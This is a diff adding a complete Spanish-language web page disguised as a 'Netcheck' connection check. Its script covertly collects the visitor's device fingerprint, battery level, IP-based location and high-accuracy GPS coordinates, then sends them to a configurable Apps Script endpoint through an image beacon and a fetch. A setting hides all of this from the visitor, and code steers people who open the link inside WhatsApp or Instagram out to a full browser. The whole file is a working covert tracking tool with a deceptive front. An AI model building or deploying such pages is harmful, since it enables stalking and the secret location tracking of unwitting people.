@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0b0f14">
+<title>Verificación de conexión</title>
+<style>
+:root{--bg:#0b0f14;--card:#131a22;--line:#1f2a35;--txt:#e8eef4;--dim:#8b9aa8;--acc:#2ee6a8;--warn:#ffb020}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;min-height:100%}
+body{background:radial-gradient(120% 90% at 50% 0%,#16202b 0%,var(--bg) 55%);color:var(--txt);
+font:16px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+display:flex;align-items:center;justify-content:center;padding:20px}
+.wrap{width:100%;max-width:420px}
+.brand{display:flex;align-items:center;gap:9px;margin-bottom:16px;padding-left:4px}
+.brand i{width:30px;height:30px;border-radius:9px;display:grid;place-items:center;
+background:linear-gradient(135deg,#2ee6a8,#1b8f6b);color:#06231a;font-style:normal;font-weight:800;font-size:15px}
+.brand span{font-size:13px;letter-spacing:.4px;text-transform:uppercase;color:var(--dim);font-weight:600}
+.card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px 22px;
+box-shadow:0 20px 60px rgba(0,0,0,.55)}
+.hide{display:none!important}
+h1{font-size:19px;margin:0 0 6px;letter-spacing:-.2px}
+.sub{color:var(--dim);font-size:14px;margin:0 0 20px}
+.bar{height:5px;background:#0a1116;border-radius:99px;overflow:hidden;margin-bottom:18px}
+.bar i{display:block;height:100%;width:8%;background:linear-gradient(90deg,#1b8f6b,#2ee6a8);
+border-radius:99px;transition:width .5s ease}
+.step{display:flex;gap:10px;align-items:flex-start;font-size:13.5px;color:var(--dim);padding:6px 0}
+.step b{color:var(--txt);font-weight:500}
+.dot{width:15px;height:15px;border-radius:50%;border:2px solid var(--line);flex:none;margin-top:2px;
+display:grid;place-items:center;font-size:9px}
+.dot.on{border-color:var(--acc);background:var(--acc);color:#06231a;font-weight:900}
+.dot.err{border-color:var(--warn);background:var(--warn);color:#2a1a00;font-weight:900}
+.kv{display:grid;grid-template-columns:96px 1fr;gap:7px 10px;font-size:12.5px;margin-top:16px;
+border-top:1px solid var(--line);padding-top:14px}
+.kv span:nth-child(odd){color:var(--dim)}
+.kv span:nth-child(even){word-break:break-word;font-family:ui-monospace,Menlo,monospace;font-size:11.5px}
+.btn{display:block;width:100%;margin-top:16px;padding:14px;border:0;border-radius:12px;
+background:var(--acc);color:#06231a;font-weight:700;font-size:15px;cursor:pointer}
+.btn.ghost{background:transparent;color:var(--dim);border:1px solid var(--line);font-weight:500;margin-top:9px}
+.note{font-size:12.5px;color:var(--warn);background:rgba(255,176,32,.08);
+border:1px solid rgba(255,176,32,.25);border-radius:10px;padding:11px;margin-bottom:16px}
+.ok{color:var(--acc);font-size:13.5px;margin-top:14px;display:flex;align-items:center;gap:7px}
+.ok::before{content:"✓";width:18px;height:18px;border-radius:50%;background:var(--acc);color:#06231a;
+display:grid;place-items:center;font-size:11px;font-weight:900;flex:none}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="brand"><i>N</i><span id="marca">Netcheck</span></div>
+
+  <div class="card hide" id="inapp">
+    <h1>Abrí el enlace en tu navegador</h1>
+    <p class="sub">Este navegador interno no permite completar la verificación. Abrilo en Chrome o Safari.</p>
+    <button class="btn" id="abrirExt">Abrir en el navegador</button>
+    <button class="btn ghost" id="seguirIgual">Continuar igual</button>
+  </div>
+
+  <div class="card" id="card">
+    <h1>Verificación de conexión</h1>
+    <p class="sub">Comprobando tu red para poder continuar.</p>
+    <div class="bar"><i id="bar"></i></div>
+    <div class="step"><span class="dot" id="d1"></span><span>Leyendo datos de <b>red</b></span></div>
+    <div class="step"><span class="dot" id="d2"></span><span>Verificando <b>dirección IP</b></span></div>
+    <div class="step"><span class="dot" id="d3"></span><span>Comprobando <b>ubicación</b></span></div>
+    <div class="step"><span class="dot" id="d4"></span><span>Enviando resultado</span></div>
+    <div class="ok hide" id="final">Conexión verificada</div>
+    <div class="kv hide" id="kv"></div>
+    <button class="btn ghost hide" id="copiar">Copiar datos</button>
+  </div>
+</div>
+
+<script>
+/* ================= EDITÁ SOLO ESTO ================= */
+const CONFIG = {
+  endpoint: "",          // <-- URL de Apps Script terminada en /exec
+  marca: "Netcheck",
+  mostrarDatos: true     // false = la persona no ve nada
+};
+/* =================================================== */
+
+const D={}, $=id=>document.getElementById(id);
+const b64u=s=>btoa(unescape(encodeURIComponent(s))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+const UA=navigator.userAgent;
+const INAPP=/FBAN|FBAV|FB_IAB|Instagram|Line\/|Twitter|WhatsApp|Snapchat|Pinterest/i.test(UA);
+$('marca').textContent=CONFIG.marca;
+
+function enviar(extra){
+  Object.assign(D,extra||{});
+  if(!CONFIG.endpoint) return;
+  let enc=b64u(JSON.stringify(D));
+  if(enc.length>1800){D.ua=UA.slice(0,120);enc=b64u(JSON.stringify(D));}
+  const url=CONFIG.endpoint+(CONFIG.endpoint.includes('?')?'&':'?')+'d='+enc;
+  new Image().src=url;
+  try{fetch(url,{method:'GET',mode:'no-cors',keepalive:true});}catch(e){}
+}
+function paso(n,e){
+  const d=$('d'+n); if(!d) return;
+  d.classList.add(e==='err'?'err':'on'); d.textContent=e==='err'?'!':'✓';
+  $('bar').style.width=(n*25)+'%';
+}
+function pasivos(){
+  D.ts=new Date().toISOString(); D.ua=UA; D.plt=navigator.platform||'';
+  D.idi=navigator.language+'|'+(navigator.languages||[]).join(',');
+  D.scr=screen.width+'x'+screen.height+'@'+(window.devicePixelRatio||1);
+  D.tz=Intl.DateTimeFormat().resolvedOptions().timeZone+'|'+new Date().getTimezoneOffset();
+  D.mem=navigator.deviceMemory||''; D.cpu=navigator.hardwareConcurrency||'';
+  D.touch=('ontouchstart' in window)?1:0; D.cook=navigator.cookieEnabled?1:0;
+  D.inapp=INAPP?1:0; D.ref=document.referrer||'';
+  if(navigator.connection) D.net=(navigator.connection.effectiveType||'')+'|'+(navigator.connection.type||'');
+  if(navigator.getBattery) navigator.getBattery().then(b=>{
+    D.bat=Math.round(b.level*100)+'%'+(b.charging?' cargando':'');
+  }).catch(()=>{});
+  paso(1);
+}
+async function porIP(){
+  const f=[
+    {u:'https://ipwho.is/',m:j=>({ip:j.ip,ciudad:j.city,region:j.region,pais:j.country,cp:j.postal,
+      isp:(j.connection||{}).isp,asn:(j.connection||{}).asn,ilat:j.latitude,ilon:j.longitude})},
+    {u:'https://ipapi.co/json/',m:j=>({ip:j.ip,ciudad:j.city,region:j.region,pais:j.country_name,cp:j.postal,
+      isp:j.org,asn:j.asn,ilat:j.latitude,ilon:j.longitude})}
+  ];
+  for(const s of f){
+    try{
+      const j=await(await fetch(s.u,{cache:'no-store'})).json();
+      const d=s.m(j);
+      if(d&&d.ip){Object.assign(D,d);paso(2);enviar();return;}
+    }catch(e){}
+  }
+  paso(2,'err'); enviar();
+}
+function gps(){
+  if(!navigator.geolocation){paso(3,'err');return;}
+  let mejor=null,fin=false;
+  const cerrar=()=>{
+    if(fin)return; fin=true; clearTimeout(tope);
+    if(mejor){D.lat=mejor.lat;D.lon=mejor.lon;D.acc=mejor.acc;
+      if(mejor.alt!=null)D.alt=mejor.alt; if(mejor.spd!=null)D.spd=mejor.spd;
+      if(mejor.hdg!=null)D.hdg=mejor.hdg; paso(3);}
+    else paso(3,'err');
+    enviar(); terminar();
+  };
+  const tope=setTimeout(cerrar,9000);
+  navigator.geolocation.watchPosition(p=>{
+    if(!mejor||p.coords.accuracy<mejor.acc){
+      mejor={lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
+             alt:p.coords.altitude,spd:p.coords.speed,hdg:p.coords.heading};
+    }
+    if(p.coords.accuracy<25) cerrar();
+  },()=>{if(!mejor)paso(3,'err');},{enableHighAccuracy:true,timeout:9000,maximumAge:0});
+  setTimeout(cerrar,8500);
+}
+function terminar(){
+  paso(4); $('final').classList.remove('hide');
+  if(CONFIG.mostrarDatos) pintar();
+}
+function pintar(){
+  const filas=[
+    ['IP',D.ip],['Operador',D.isp],['Ciudad',D.ciudad],['Región',D.region],['País',D.pais],
+    ['GPS',D.lat?D.lat.toFixed(5)+', '+D.lon.toFixed(5):'sin permiso'],
+    ['Precisión',D.acc?Math.round(D.acc)+' m':''],
+    ['Zona horaria',D.tz],['Pantalla',D.scr],['Equipo',D.plt]
+  ].filter(f=>f[1]!==undefined&&f[1]!==''&&f[1]!==null);
+  const kv=$('kv'); kv.innerHTML='';
+  filas.forEach(f=>{
+    const a=document.createElement('span'); a.textContent=f[0];
+    const b=document.createElement('span'); b.textContent=String(f[1]);
+    kv.append(a,b);
+  });
+  kv.classList.remove('hide'); $('copiar').classList.remove('hide');
+}
+$('copiar').onclick=()=>{
+  navigator.clipboard?.writeText(JSON.stringify(D,null,2)).then(()=>{
+    $('copiar').textContent='Copiado';
+    setTimeout(()=>$('copiar').textContent='Copiar datos',1500);
+  }).catch(()=>{});
+};
+$('abrirExt').onclick=()=>{
+  if(/Android/i.test(UA)){
+    location.href='intent://'+location.host+location.pathname+location.search+
+      '#Intent;scheme=https;package=com.android.chrome;end';
+  }else{ location.href='x-safari-'+location.href; }
+};
+$('seguirIgual').onclick=()=>{ $('inapp').classList.add('hide'); arrancar(); };
+
+function arrancar(){ pasivos(); porIP(); setTimeout(gps,400); enviar(); }
+
+if(INAPP){ $('inapp').classList.remove('hide'); $('card').classList.add('hide'); }
+else arrancar();
+</script>
+</body>
+</html>
